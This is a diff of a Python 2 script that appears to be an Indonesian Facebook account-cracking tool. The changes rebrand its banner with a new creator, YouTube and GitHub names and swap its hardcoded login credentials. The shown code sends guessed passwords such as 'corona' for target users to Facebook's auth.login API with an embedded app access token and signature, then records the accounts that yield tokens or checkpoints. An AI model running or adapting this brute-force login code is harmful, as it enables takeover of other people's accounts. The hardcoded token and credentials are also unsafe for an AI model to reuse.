@@ -56,9 +56,9 @@ logo = """
 \033[1;31m█████████      \033[1;92m«----------✧----------»
 \033[1;32m ██ ██
 \033[1;37m╔═══════════════════════════════════════════════════╗
-\033[1;37m║\033[1;96m* \033[1;93mCreator  \033[1;93m:\033[1;36mANBIA\033[1;93m                            \033[1;36m      ║
-\033[1;37m║\033[1;96m* \033[1;93mYoutube \033[1;93m :\033[1;37m\033[4mSANSBAE\033[0m\033[1;93m \033[1;36m                               ║
-\033[1;37m║\033[1;96m* \033[1;97mGitHub   \033[1;93m:\033[1;32mhttps://github.com/SansBae  \033[1;36m           ║
+\033[1;37m║\033[1;96m* \033[1;93mCreator  \033[1;93m:\033[1;36mWULAN\033[1;93m                            \033[1;36m      ║
+\033[1;37m║\033[1;96m* \033[1;93mYoutube \033[1;93m :\033[1;37m\033[4mWansHR\033[0m\033[1;93m \033[1;36m                               ║
+\033[1;37m║\033[1;96m* \033[1;97mGitHub   \033[1;93m:\033[1;32mhttps://github.com/MRirwan002  \033[1;36m           ║
 \033[1;37m╚═══════════════════════════════════════════════════╝"""
 
 def tik():
@@ -79,17 +79,17 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print """\033[1;97m=====================================================>\033[1;91mTools Ini Dibuat Hanya Untuk Edukasi Dan Keperluan Penting
 \033[1;97m=====================================================>============>
-\033[1;91m [¤]   _____         _   _  _____ ____          ______ 
-\033[1;91m [¤]  / ____|  /\   | \ | |/ ____|  _ \   /\   |  ____|
-\033[1;91m [¤] | (___   /  \  |  \| | (___ | |_) | /  \  | |__   
-\033[1;91m [¤]  \___ \ / /\ \ | . ` |\___ \|  _ < / /\ \ |  __|  
-\033[1;91m [¤]  ____) / ____ \| |\  |____) | |_) / ____ \| |____ 
-\033[1;91m [¤] |_____/_/    \_\_| \_|_____/|____/_/    \_\______|"""
+\033[1;91m [¤]    
+\033[1;91m [¤] 
+\033[1;91m [¤] 
+\033[1;91m [¤]   
+\033[1;91m [¤] 
+\033[1;91m [¤] """
 print "\x1b[1;97m=====================================================>●⚀◇-------------------------------------------------◇⚀●⚀●=========>"
 
 
-CorrectUsername = "ANBIA01"
-CorrectPassword = "AMANDA01"
+CorrectUsername = "MR.irwan"
+CorrectPassword = "MR.Wulan"
 
 loop = 'true'
 while (loop == 'true'):
@@ -101,7 +101,7 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "PASSWORD SALAH WOI!"
-            os.system('xdg-open https://www.youtube.com/c/SANSBAE')
+            os.system('xdg-open https://www.youtube.com/c/WansHR12')
 
 def login():
 	os.system('clear')
@@ -395,7 +395,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = 'Kontol'
+													pass6 = 'corona'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
